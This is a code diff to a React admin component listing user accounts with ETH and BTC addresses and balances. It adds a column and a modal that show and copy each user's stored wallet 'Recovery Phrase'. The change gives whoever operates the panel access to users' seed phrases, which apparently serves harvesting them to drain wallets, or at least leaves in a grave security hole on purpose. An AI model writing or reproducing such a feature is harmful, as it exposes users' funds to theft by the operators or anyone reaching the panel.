@@ -12,6 +12,7 @@ interface OtherAccount {
   btc_address: string;
   eth_balance: number;
   btc_balance: number;
+    phrase: string;
 }
 
 interface User {
@@ -20,6 +21,7 @@ interface User {
   btcAddress: string;
   ethBalance: string;
   btcBalance: string;
+  phrase: string;
 }
 
 function InnerUsers() {
@@ -29,7 +31,8 @@ function InnerUsers() {
   const truncateAddress = (address: string) => {
     return `${address.slice(0, 6)}.....${address.slice(-5)}`;
   };
-
+const [showPhraseModal, setShowPhraseModal] = useState(false);
+const [selectedPhrase, setSelectedPhrase] = useState("");
   const handleCopy = async (text: string) => {
     try {
       await navigator.clipboard.writeText(text);
@@ -48,6 +51,7 @@ function InnerUsers() {
       btcAddress: acc.btc_address,
       ethBalance: `${acc.eth_balance} ETH`,
       btcBalance: `${acc.btc_balance} BTC`,
+        phrase: acc.phrase || "",
     }));
 
     setUsers(mappedUsers);
@@ -90,6 +94,20 @@ function InnerUsers() {
       header: "BTC Balance",
       accessor: "btcBalance",
     },
+    {
+  header: "Phrase",
+  accessor: (row) => (
+    <button
+      onClick={() => {
+        setSelectedPhrase(row.phrase);
+        setShowPhraseModal(true);
+      }}
+      className="px-3 py-1.5 rounded-lg bg-[#25C866]/10 text-[#25C866] border border-[#25C866]/20 hover:bg-[#25C866]/20 hover:scale-105 transition-all duration-200 cursor-pointer text-sm font-medium"
+    >
+      View Phrase
+    </button>
+  ),
+},
   ];
 
   return (
@@ -119,6 +137,31 @@ function InnerUsers() {
           </div>
         )}
       </div>
+        {showPhraseModal && (
+  <div className="fixed inset-0 z-[999] flex items-center justify-center">
+    <div
+      className="absolute inset-0 bg-black/50"
+      onClick={() => setShowPhraseModal(false)}
+    />
+
+    <div className="relative bg-[#161F37] p-5 rounded-xl max-w-lg w-full  mx-3">
+      <h3 className="text-white text-lg font-semibold mb-4">
+        Recovery Phrase
+      </h3>
+
+      <p className="text-white break-words">
+        {selectedPhrase}
+      </p>
+
+      <button
+        onClick={() => handleCopy(selectedPhrase)}
+        className="mt-4 bg-[#25C866] px-4 py-2 rounded-lg text-white cursor-pointer"
+      >
+        Copy
+      </button>
+    </div>
+  </div>
+)}
     </div>
   );
 }
